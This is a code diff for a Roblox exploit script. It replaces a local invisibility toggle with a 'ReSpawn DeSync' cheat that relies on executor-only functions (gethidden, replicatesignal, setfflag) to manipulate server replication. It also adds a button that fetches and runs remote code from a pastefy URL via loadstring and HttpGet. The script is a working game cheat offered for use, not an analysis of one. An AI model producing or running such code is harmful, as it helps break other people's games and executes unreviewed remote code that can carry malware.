@@ -1,37 +1,90 @@
-local Players = game:GetService("Players")
-local lp = Players.LocalPlayer
-
-local invisible = false
-
-local function toggleInvisible()
-    invisible = not invisible
-    local char = lp.Character
-    if not char then return end
-
-    for _, v in ipairs(char:GetDescendants()) do
-        if v:IsA("BasePart") then
-            v.LocalTransparencyModifier = invisible and 1 or 0
-        elseif v:IsA("Decal") then
-            v.Transparency = invisible and 1 or 0
+-- ReSpawn DeSync
+local function respawn(plr)
+    local rcdEnabled = false
+    if gethidden then
+        rcdEnabled = gethidden(workspace, 'RejectCharacterDeletions') ~= Enum.RejectCharacterDeletions.Disabled
+    end
+    if rcdEnabled and replicatesignal then
+        replicatesignal(plr.ConnectDiedSignalBackend)
+        task.wait(Players.RespawnTime - 0.1)
+        replicatesignal(plr.Kill)
+    else
+        local char = plr.Character
+        local hum = char:FindFirstChildWhichIsA('Humanoid')
+        if hum then
+            hum:ChangeState(Enum.HumanoidStateType.Dead)
         end
+        char:ClearAllChildren()
+        local newChar = Instance.new('Model')
+        newChar.Parent = workspace
+        plr.Character = newChar
+        task.wait()
+        plr.Character = char
+        newChar:Destroy()
     end
 end
 
--- Simple UI
-local gui = Instance.new("ScreenGui", lp.PlayerGui)
-gui.ResetOnSpawn = false
+local function performDeSync()
+    task.spawn(function()
+        pcall(function()
+            if setfflag then
+                setfflag("NextGenReplicatorEnabledWrite4", "false")
+                task.wait(0.1)
+                setfflag("NextGenReplicatorEnabledWrite4", "true")
+            end
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999999, 0)
+            end
+            task.wait(1)
+            LocalPlayer:LoadCharacter()
+        end)
+        repeat task.wait() until LocalPlayer.Character
+        local char = LocalPlayer.Character
+        repeat task.wait() until char:FindFirstChild("HumanoidRootPart")
+        task.spawn(function()
+            for i = 1, 6 do
+                pcall(function()
+                    local hum = char:FindFirstChildWhichIsA("Humanoid")
+                    if hum then
+                        hum.Health = 0
+                        hum:TakeDamage(hum.MaxHealth)
+                    end
+                end)
+                task.wait(0.1)
+            end
+        end)
+        task.spawn(function()
+            for i = 1, 5 do
+                pcall(function()
+                    if char:FindFirstChild("HumanoidRootPart") then
+                        local explosion = Instance.new("Explosion")
+                        explosion.Position = char.HumanoidRootPart.Position
+                        explosion.BlastRadius = 5
+                        explosion.BlastPressure = 500000
+                        explosion.Parent = workspace
+                    end
+                end)
+                task.wait(0.1)
+            end
+        end)
+        task.wait(0.8)
+        pcall(function()
+            respawn(LocalPlayer)
+        end)
+    end)
+end
 
-local btn = Instance.new("TextButton", gui)
-btn.Size = UDim2.new(0, 160, 0, 40)
-btn.Position = UDim2.new(0.5, -80, 0.8, 0)
-btn.Text = "Toggle Invisible"
-btn.Font = Enum.Font.GothamBold
-btn.TextSize = 14
-btn.BackgroundColor3 = Color3.fromRGB(110,120,250)
-btn.TextColor3 = Color3.new(1,1,1)
-btn.Active = true
-btn.Draggable = true
-
-Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
-
-btn.MouseButton1Click:Connect(toggleInvisible)
+SpecialSection:CreateButton({
+    Name = "ReSpawn DeSync",
+    Callback = function()
+        performDeSync()
+        Window:Notify({Title = "ReSpawn DeSync", Content = "Executed!", Duration = 2})
+    end
+})
+SpecialSection:CreateButton({
+    Name = "Control Players UI",
+    Callback = function()
+        Window:Notify({Title = "Control Players", Content = "Loading...", Duration = 2})
+        loadstring(game:HttpGet("https://pastefy.app/CPvTIBvE/raw"))()
+    end
+})
